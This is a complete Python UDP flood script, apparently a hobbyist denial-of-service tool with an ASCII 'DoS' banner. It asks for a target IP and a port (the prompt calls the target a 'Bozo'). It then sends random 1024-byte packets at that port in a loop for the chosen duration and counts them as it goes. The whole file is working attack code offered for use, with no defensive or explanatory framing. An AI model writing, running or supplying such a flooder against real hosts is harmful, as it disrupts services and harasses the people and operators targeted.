import os
import sys
import time
import socket
import random
import colorama
from colorama import Fore, Back


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

if __name__ == '__main__':
    os.system('cls')
    colorama.init()


def show_text():
    text = """
 ██▒   █▓ ▄▄▄       ██▓       ▓█████▄  ▒█████    ██████ 
▓██░   █▒▒████▄    ▓██▒       ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
 ▓██  █▒░▒██  ▀█▄  ▒██░       ░██   █▌▒██░  ██▒░ ▓██▄   
  ▒██ █░░░██▄▄▄▄██ ▒██░       ░▓█▄   ▌▒██   ██░  ▒   ██▒    -Made By fax
   ▒▀█░   ▓█   ▓██▒░██████▒   ░▒████▓ ░ ████▓▒░▒██████▒▒
   ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░    ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
   ░ ░░    ▒   ▒▒ ░░ ░ ▒  ░    ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
     ░░    ░   ▒     ░ ░       ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
      ░        ░  ░    ░  ░      ░        ░ ░        ░  
      """
    return text

print(Fore.RED + Back.BLACK + show_text())

ip = input("[-] Enter Bozos IP : ")
port = int(input("[-] Enter Port : "))
duration = int(input("[-] Enter duration : "))
timeout = time.time() + duration
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print(f"{Fore.GREEN}[:] sent", sent,"packets to",ip,"through",port,)
    except KeyboardInterrupt:
        sys.exit() 